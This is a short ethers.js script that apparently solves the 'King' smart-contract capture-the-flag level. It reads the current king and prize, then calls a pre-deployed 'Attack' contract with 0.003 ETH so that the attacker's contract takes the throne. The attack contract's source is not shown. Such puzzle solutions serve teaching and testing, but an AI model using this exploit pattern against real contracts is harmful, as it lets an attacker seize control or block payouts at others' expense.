const attackContractAddress = '0x20398931C3aFbD299c46BBCF9119064Ca022F967';
(async() => {
    const account = await ethers.getSigner();
    const kingContract = await ethers.getContractAt("King", process.env.INSTANCE, account);

    var king = await kingContract._king();
    log(`king : ${king}`)
    prize = await ethers.provider.getStorageAt(kingContract.address, 1);
    log(`current prize : ${ethers.utils.formatEther(Number(prize))}ETH`)

    const attackContract = await ethers.getContractAt("Attack", attackContractAddress, account);

    log('waiting...')
    tx = await attackContract.attack({value: ethers.utils.parseEther("0.003")})
    await tx.wait()
    var king = await kingContract._king();
    log(`king : ${king}`)

    if (king == attackContractAddress){
        log(`king == "Attack Contract" !!`)
    }
})();